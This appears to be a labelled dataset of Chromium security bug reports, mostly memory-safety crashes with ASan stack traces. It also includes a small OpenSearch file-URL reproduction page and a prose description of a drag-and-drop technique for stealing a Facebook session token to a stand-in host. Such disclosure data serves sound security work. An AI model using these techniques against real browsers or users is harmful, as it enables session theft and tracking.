heap-use-after-free in openpdfinreaderbubbleview buttonpressed version chrome version 41.0.2257.0 canary 39.0.2171.95 dev-m operating system win7 crash id 5dc199ce255e6925 steps 1 open repro-pdf.html 2 click on the button to open test.pdf link in new tab and click on pdf bubble as in 1.png then after 5s the page will be changed as in 2.png 3 click on done button or open in adobe reader link the problem is that if a tab is changed location or closed via javascript bubble is n't closing and is stays open eax=f8242b1e ebx=0c711718 ecx=09bcfb80 edx=0c711700 esi=0b95ac3c edi=0017eb60 eip=60fbed1b esp=0017ea24 ebp=0017ea34 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_602c0000 openpdfinreaderbubbleview buttonpressed 60fbed1b ff5018 call dword ptr eax+18h ds:0023 f8242b36 0:000 k childebp retaddr 0017ea24 6144cc46 chrome_602c0000 openpdfinreaderbubbleview buttonpressed c b\build\slave\win\build\src\chrome\browser\ui\views\open_pdf_in_reader_bubble_view.cc 68 0017ea34 61458256 chrome_602c0000 views button notifyclick c b\build\slave\win\build\src\ui\views\controls\button\button.cc 75 0017ea50 614433d1 chrome_602c0000 views custombutton onmousereleased c b\build\slave\win\build\src\ui\views\controls\button\custom_button.cc 157 0017ea6c 61443117 chrome_602c0000 views view processmousereleased c b\build\slave\win\build\src\ui\views\view.cc 2299 0017ea80 605aae89 chrome_602c0000 views view onmouseevent c b\build\slave\win\build\src\ui\views\view.cc 988 0017ea94 605abc75 chrome_602c0000 ui eventhandler onevent c b\build\slave\win\build\src\ui\events\event_handler.cc 29 0017eaac 605aae1a chrome_602c0000 ui eventtarget onevent c b\build\slave\win\build\src\ui\events\event_target.cc 64 0017eac4 605aac26 chrome_602c0000 ui eventdispatcher dispatchevent c b\build\slave\win\build\src\ui\events\event_dispatcher.cc 190 0017eae0 605aab26 chrome_602c0000 ui eventdispatcher processevent c b\build\slave\win\build\src\ui\events\event_dispatcher.cc 138 0017eb14 605aa16c chrome_602c0000 ui eventdispatcherdelegate dispatcheventtotarget c b\build\slave\win\build\src\ui\events\event_dispatcher.cc 86 0017eb3c 61461863 chrome_602c0000 ui eventdispatcherdelegate dispatchevent c b\build\slave\win\build\src\ui\events\event_dispatcher.cc 57 0017ed14 6144969f chrome_602c0000 views internal rootview onmousereleased c b\build\slave\win\build\src\ui\views\widget\root_view.cc 456 0017ed44 6144ac6b chrome_602c0000 views widget onmouseevent c b\build\slave\win\build\src\ui\views\widget\widget.cc 1233 0017ed58 605aae89 chrome_602c0000 views desktopnativewidgetaura onmouseevent c b\build\slave\win\build\src\ui\views\widget\desktop_aura\desktop_native_widget_aura.cc 1043 0017ed6c 605abc6c chrome_602c0000 ui eventhandler onevent c b\build\slave\win\build\src\ui\events\event_handler.cc 29 0017ed84 605aae1a chrome_602c0000 ui eventtarget onevent c b\build\slave\win\build\src\ui\events\event_target.cc 63 0017ed9c 605aac26 chrome_602c0000 ui eventdispatcher dispatchevent c b\build\slave\win\build\src\ui\events\event_dispatcher.cc 190 0017edb8 605aab26 chrome_602c0000 ui eventdispatcher processevent c b\build\slave\win\build\src\ui\events\event_dispatcher.cc 138 0017edec 605aa16c chrome_602c0000 ui eventdispatcherdelegate dispatcheventtotarget c b\build\slave\win\build\src\ui\events\event_dispatcher.cc 86 0017ee14 605a971d chrome_602c0000 ui eventdispatcherdelegate dispatchevent c b\build\slave\win\build\src\ui\events\event_dispatcher.cc 57	11
security opensearch description files can be loaded from file urls security opensearch description files can be loaded from file urls vulnerability details when a webpage uses link rel search type application/opensearchdescription+xml href url to point to an opensearch description file the renderer will give the uri to the privileged browser process using a chromeviewhostmsg_pagehasosdd message searchenginetabhelper onpagehasosdd will then download the xml file from the given url and use it to configure a search engine even if the webpage comes from an http origin and the url points to the local filesystem i can think of some ways in which this might be usable for an attacker if an attacker can cause secret information to be embedded in a file with an attacker-controlled structure he might be able to create a search engine that when used transfers the secret to the attacker when the search engine is used for the first time this seems pretty unlikely to me though an attacker might be able to use this in order to track users more invasively if he can place a search description file with a unique tracking identifier on a user s computer e.g by triggering a file download he could later use the path to the file to add the search engine giving him the unique tracking token the next time the user performs a search this tracking token would persist across browser profiles it might be possible to use this to detect the existence of files on the local filesystem using timing or depending on the size of the file by detecting that the browser is suddenly gone attempting to parse a 692mb file causes the browser to kill itself with a mov byte ptr ds maybe i ll try to find out whether this works in the following days version chrome version 38.0.2125.104 stable operating system debian jessie reproduction case put this into the webroot of a webserver doctype html html head link rel search type application/opensearchdescription+xml href file tmp/quark title quark head body body html then save something like this as tmp/quark xml version 1.0 opensearchdescription xmlns shortname foobarbaz shortname description foo bar baz description url type text/html method get template searchterms opensearchdescription now navigate to the root of the webserver then look at the search engine list in the settings you should see a new entry with foobarbaz in the first column and in the third one	5
security inherited designmode and cross-window drag-n-drop allow to modify a cross-origin iframe s dom vulnerability details tl dr dragging things to places can lead to a kind of uxss condition rich-text mode designmode is inherited by cross-origin iframes thus allowing to drag dom elements between windows of different origins if this action is properly concealed a user could unwittigly modify the dom of arbitrary domains to behave in harmful ways if you document.designmode on even cross-domain frame children will become editable but still disallow drag and drop interaction with the parent document this restriction does not apply to different windows though so you can drag an image from a different window or tab into the frame which will then happily insert the new element into the dom when dropping html elements however all event properties and script links will be removed rendering immediate xss execution impossible as far as i know but there are equally dangerous payloads that do n't require javascript for instance you can drag a button into a form in order to spoof the form target and redirect security tokens to an arbitrary domain proper use of the x-frame-options header does not really diminish the impact here since almost every big website excludes certain pages from embedding restrictions like facebook allows sharing buttons to be loaded in iframes i included a proof of concept which roughly outlines a real-life attack to aquire the facebook session token fb_dtsg instead of scrolling the user will be tricked into dragging a submit button into a new tab containing a facebook comment box the button will overlap the frame and submit the comment form to example.com/evilpage once clicked which essentially reveals the session token this poc assumes that you are currently logged in on facebook and that you allow popups for the current page although there should be other ways to change the active tab furthermore race conditions might occur if you release the mouse button before the iframe has loaded or if facebook changes the form ids if required i could attempt to further optimize the reliability of the poc similar techniques should be possible for most domains in the best case allowing for attacks equivalent to xss or csrf note how this also allows for escalation through a standard self-xss issue which would usually only be exploitable with grotesque social engineering the facebook poc for reference feasibility of enforcing drag operations has been discussed here version chrome version 41.0.2251.0 official build dev operating system 3.17.4-1-arch x86_64 gnu/linux reproduction case create an iframe and load a cross-origin resource like set document.designmode on drag an element from a different window into the frame the node should be copied to the frame s dom	2
security heap-use-after-free in blink consumerwrapper consumeaudio version chrome version 41.0.2272.118 operating system windows 7 7748==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t23 0 in blink consumerwrapper consumeaudio c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\exported\webmediastreamsource.cpp:209 1 in blink mediastreamsource consumeaudio c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\mediastream\mediastreamsource.cpp:105 2 in blink mediastreamaudiodestinationnode process c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\webaudio\mediastreamaudiodestina tionnode.cpp:79 3 in blink audionode processifnecessary c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\webaudio\audionode.cpp:634 4 in blink audiocontext processautomaticpullnodes c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\webaudio\audiocontext.cpp:1133 5 in blink audiodestinationnode render c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\webaudio\audiodestinationnode.cpp:93 6 in blink audiodestination provideinput c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\audio\audiodestination.cpp:175 7 in blink audiopullfifo consume c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\audio\audiopullfifo.cpp:65 8 in blink audiodestination render c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\audio\audiodestination.cpp:164 9 in content rendererwebaudiodeviceimpl render c b\build\slave\win_asan_release\build\src\content\renderer\media\renderer_webaudiodevice_impl.cc:90 10 in media audiooutputdevice audiothreadcallback process c b\build\slave\win_asan_release\build\src\media\audio\audio_output_device.cc:297 11 in media audiodevicethread thread run c b\build\slave\win_asan_release\build\src\media\audio\audio_device_thread.cc:183 12 in media audiodevicethread thread threadmain c b\build\slave\win_asan_release\build\src\media\audio\audio_device_thread.cc:158 is located 0 bytes inside of 88-byte region freed by thread t0 here 0 in free c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:42 1 in content webaudiocapturersource scalar deleting destructor c b\build\slave\win_asan_release\build\src\content\renderer\media\webaudio_capturer_source.cc:2 7 2 in content webrtclocalaudiotrack stop c b\build\slave\win_asan_release\build\src\base\memory\ref_counted.h:192 3 in content mediastreamcenter didstopmediastreamtrack c b\build\slave\win_asan_release\build\src\content\renderer\media\media_stream_center.cc:119 4 in blink mediastreamcenter didstopmediastreamtrack c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\mediastream\mediastreamcenter cpp:94 5 in blink mediastreamtrack stoptrack c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\mediastream\mediastreamtrack.cpp:159 6 in blink heap allocate blink positionerrorcallback c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\modules\v8\v8mediastreamtrack.c pp:267 7 in v8 internal functioncallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:33 8 in v8 internal builtins invokeapifunction c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1077 9 in v8 internal builtins builtins c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1100 previously allocated by thread t0 here 0 in malloc c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:58 1 in operator new f dd\vctools\crt\crtw32\heap\new.cpp:59 2 in content peerconnectiondependencyfactory createwebaudiosource c b\build\slave\win_asan_release\build\src\content\renderer\media\webrtc\peer_connection_depen dency_factory.cc:508 3 in content peerconnectiondependencyfactory createlocalaudiotrack c b\build\slave\win_asan_release\build\src\content\renderer\media\webrtc\peer_connection_depe ndency_factory.cc:463 4 in content mediastreamcenter didcreatemediastreamtrack c b\build\slave\win_asan_release\build\src\content\renderer\media\media_stream_center.cc:44 5 in content mediastreamcenter didcreatemediastreamtrack c b\build\slave\win_asan_release\build\src\content\renderer\media\media_stream_center.cc:96 6 in blink mediastreamcenter didcreatemediastreamandtracks c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\mediastream\mediastream center.cpp:123 7 in blink mediastreamaudiodestinationnode mediastreamaudiodestinationnode c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\webaudio mediastreamaudiodestinationnode.cpp:52 8 in blink mediastreamaudiodestinationnode create c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\webaudio\mediastreamaudiodestinat ionnode.cpp:40 9 in blink audiocontext createmediastreamdestination c b\build\slave\win_asan_release\build\src\third_party\webkit\source\modules\webaudio\audiocontext.cpp:388 10 in blink screenorientation setonchange c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\modules\v8\v8audiocontext.cpp:346 11 in v8 internal functioncallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:33 12 in v8 internal builtins invokeapifunction c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1077 13 in v8 internal builtins builtins c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1100 thread t23 created by t2 here 0 in asan_wrap_createthread c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:93 thread t2 created by t0 here 0 in asan_wrap_createthread c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:93 summary addresssanitizer heap-use-after-free c b\build\slave\win_asan_release\build\src\third_party\webkit\source\platform\exported\webmediastreamsource.cpp:209 blink consumer wrapper consumeaudio shadow bytes around the buggy address fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 04 fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 7748==aborting	11
heap-use-after-free in blink smiltimecontainer updateanimations tested on os ubuntu 14.04 chrome asan-symbolized-linux-release-325771 note there is some timing condition in the repro-file it prevents me from minimizing the file automatically so i ll take a closer look manually when i have some spare time you need to hit refresh couple of times to reproduce the crash so it might not reproduce on clusterfuzz also sometimes the crash occurs as a null-pointer and sometimes as an uaf asan-trace uaf 31305==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in operator blink svgelement blink qualifiedname mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release buildtools/third_party/libc++/trunk/include/utility:405 1 in wtf hashtablehelper wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf keyvaluepairkeyextractor wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname isemptyordeletedbucket wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashtable.h:328 2 in wtf hashtableconstiterator std 1 pair blink svgelement blink qualifiedname wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf keyvaluepairkeyextractor wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashmapvaluetraits wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf defaultallocator skipemptybuckets mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashtable.h:120 3 in wtf hashtableconstiterator std 1 pair blink svgelement blink qualifiedname wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf keyvaluepairkeyextractor wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashmapvaluetraits wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf defaultallocator operator mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashtable.h:173 4 in wtf hashtableiterator std 1 pair blink svgelement blink qualifiedname wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf keyvaluepairkeyextractor wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashmapvaluetraits wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf defaultallocator operator mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashtable.h:230 5 in wtf hashtableiteratoradapter wtf hashtable std 1 pair blink svgelement blink qualifiedname wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf keyvaluepairkeyextractor wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashmapvaluetraits wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf defaultallocator wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator operator mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashiterators.h:73 6 in updateanimations mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/smiltimecontainer.cpp:464 discriminator 3 7 in blink smiltimecontainer updateanimationsandscheduleframeifneeded blink smiltime bool mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/smiltimecontainer.cpp:432 8 in blink smiltimecontainer wakeuptimerfired blink timer blink smiltimecontainer mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/smiltimecontainer.cpp:313 9 in blink threadtimers sharedtimerfiredinternal mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/threadtimers.cpp:137 10 in blink threadtimers sharedtimerfired mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/threadtimers.cpp:107 11 in content blinkplatformimpl dotimeout mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release content/child/blink_platform_impl.h:178 12 in base internal invokehelper false void base internal runnableadapter void content blinkplatformimpl base internal typelist content blinkplatformimpl makeitso base internal runnableadapter void content blinkplatformimpl content blinkplatformimpl mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:293 is located 480 bytes inside of 768-byte region freed by thread t0 chrome here 0 in interceptor_free 1 in wtf hashtable std 1 pair blink svgelement blink qualifiedname wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf keyvaluepairkeyextractor wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashmapvaluetraits wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf defaultallocator rehash unsigned int wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashtable.h:1148 2 in wtf hashtableaddresult wtf hashtable std 1 pair blink svgelement blink qualifiedname wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf keyvaluepairkeyextractor wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashmapvaluetraits wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf defaultallocator wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf hashtable std 1 pair blink svgelement blink qualifiedname wtf keyvaluepair std 1 pair blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf keyvaluepairkeyextractor wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashmapvaluetraits wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf defaultallocator add wtf hashmaptranslator wtf hashmapvaluetraits wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf pairhash wtf rawptr blink svgelement blink qualifiedname std 1 pair blink svgelement blink qualifiedname wtf passownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator std 1 pair blink svgelement blink qualifiedname const wtf passownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashtable.h:847 3 in wtf hashmap std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf defaultallocator inlineadd std 1 pair blink svgelement blink qualifiedname const wtf passownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashmap.h:359 4 in wtf hashmap std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf pairhash wtf rawptr blink svgelement blink qualifiedname wtf hashtraits std 1 pair wtf rawptr blink svgelement blink qualifiedname wtf hashtraits wtf ownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator wtf defaultallocator add std 1 pair blink svgelement blink qualifiedname const wtf passownptr wtf linkedhashset wtf rawptr blink svgsmilelement wtf ptrhash wtf rawptr blink svgsmilelement wtf hashtraits wtf rawptr blink svgsmilelement wtf defaultallocator mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/hashmap.h:386 5 in schedule mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/smiltimecontainer.cpp:93 6 in schedule mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/svgsmilelement.cpp:1326 7 in blink svganimationelement settargetelement blink svgelement mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/svganimationelement.cpp:692 asan-trace null-pointer 30816==error addresssanitizer segv on unknown address pc bp sp t0 0 in calculateanimatedvalue mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/svganimatedtypeanimator.cpp:254 1 in calculateanimatedvalue mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/svganimateelement.cpp:99 2 in blink svganimationelement updateanimation float unsigned int blink svgsmilelement mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/svganimationelement.cpp:638 3 in blink svgsmilelement progress blink smiltime blink svgsmilelement bool mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/svgsmilelement.cpp:1184 4 in updateanimations mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/smiltimecontainer.cpp:490 5 in blink smiltimecontainer updateanimationsandscheduleframeifneeded blink smiltime bool mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/smiltimecontainer.cpp:432 6 in blink smiltimecontainer wakeuptimerfired blink timer blink smiltimecontainer mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/animation/smiltimecontainer.cpp:313 7 in blink threadtimers sharedtimerfiredinternal mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/threadtimers.cpp:137	11
container-overflow in blink fecolormatrix createimagefilter detailed report fuzzer miaubiz_svg_fuzzer job type linux_asan_chrome_mp crash type container-overflow read 4 crash address crash state blink fecolormatrix createimagefilter blink filtereffect createimagefilterwithoutvalidation blink skiaimagefilterbuilder build regressed minimized testcase 5.82 kb filer ochang	11
negative-size-param in vp9_dec_setup_mi vulnerability details the attached webm file crash the latest 32-bit asan build of chromium as follows 9999==error addresssanitizer negative-size-param size=-4206592 0 in asan_memset 1 in vp9_dec_setup_mi mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/decoder/vp9_decoder.c:49 2 in vp9_init_context_buffers mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/common/vp9_alloccommon.c:161 3 in resize_context_buffers mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/decoder/vp9_decodeframe.c:699 4 in setup_frame_size mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/decoder/vp9_decodeframe.c:712 5 in read_uncompressed_header mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/decoder/vp9_decodeframe.c:1310 6 in vp9_decode_frame mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/decoder/vp9_decodeframe.c:1544 7 in vp9_receive_compressed_data mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/decoder/vp9_decoder.c:300 8 in decode_one mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/vp9_dx_iface.c:319 9 in decoder_decode mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vp9/vp9_dx_iface.c:418 10 in vpx_codec_decode mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release third_party/libvpx/source/libvpx/vpx/src/vpx_decoder.c:122 11 in media vpxvideodecoder vpxdecode scoped_refptr media decoderbuffer const scoped_refptr media videoframe mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release media/filters/vpx_video_decoder.cc:374 12 in media vpxvideodecoder decodebuffer scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release media/filters/vpx_video_decoder.cc:351 13 in media vpxvideodecoder decode scoped_refptr media decoderbuffer const base callback void media videodecoder status const mnt/data/b/build/slave/asan_release__32-bit_x86_with_v8-arm__symbolized_/build/src/out/release 